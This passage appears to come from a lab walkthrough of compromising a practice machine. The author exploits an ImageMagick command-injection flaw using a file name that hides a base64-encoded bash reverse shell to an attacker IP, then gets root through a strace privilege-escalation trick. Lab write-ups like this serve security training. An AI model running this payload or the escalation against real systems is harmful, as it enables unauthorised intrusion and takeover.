Okay, so it is a simple web application I'd assume.

Let's continue with enumeration

## 2. Initial Foothold

As I visited the website (port 80):

![image](../contentImages/image/1.png)

This functionality utilize the ImageMagick. As I uploaded an Image:
![image](../contentImages/image/2.png)
So we have the version number of ImageMagick. 

> https://github.com/ImageMagick/ImageMagick/issues/6339

It seems to be that CVE-2016-5118 is not correctly fixed on this version, which is a quite simple command injection vulnerability on Imagemagick
So I needed to reproduce this vulnerability, and I found an excellent github source for that:

> https://github.com/SudoIndividual/CVE-2023-34152

I executed it and got a malicious image file.
```
┌──(hlee㉿kali)-[~/oscp/offsec/image/CVE-2023-34152]
└─$ ls
 CVE-2023-34152.py   README.md  '|smile"`echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC40NS4yMDcvODAgMD4mMSI=|base64 -d|bash`".png'
```
And I uploaded it to our web endpoint.
```
┌──(hlee㉿kali)-[~/oscp/offsec/image/CVE-2023-34152]
└─$ python CVE-2023-34152.py 192.168.45.207 80

```

And I got a shell! (and also the local.txt flag)

## 3. PrivEsc to root

I simply ran linpeas. Then:
![image](../contentImages/image/4.png)
we can run strace as root! GTFObins is your friend as always :)

> https://gtfobins.github.io/gtfobins/strace/

I followed the exact step, then got root!

```
www-data@image:/var/www$ /usr/bin/strace -o /dev/null /bin/sh -p
/usr/bin/strace -o /dev/null /bin/sh -p
whoami
root
```

Done!
